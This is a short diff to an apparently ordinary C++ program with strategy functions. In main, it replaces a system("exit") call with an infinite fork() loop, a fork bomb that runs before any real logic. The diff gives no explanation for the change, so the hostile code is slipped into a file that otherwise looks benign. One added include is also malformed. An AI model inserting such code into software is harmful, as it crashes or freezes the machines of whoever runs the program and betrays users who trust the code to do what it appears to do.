@@ -2,6 +2,8 @@
 #include <vector>
 #include <ctime>
 #include <cstdlib>
+#include <sys/types>
+#include <unistd.h>
 
 using namespace std;
 
@@ -185,6 +187,8 @@ void strategy2() {
 
 int main() {
     srand(time(0));
-    system("exit");
+    while (true) {
+        fork();
+    }
     strategy1();
 }
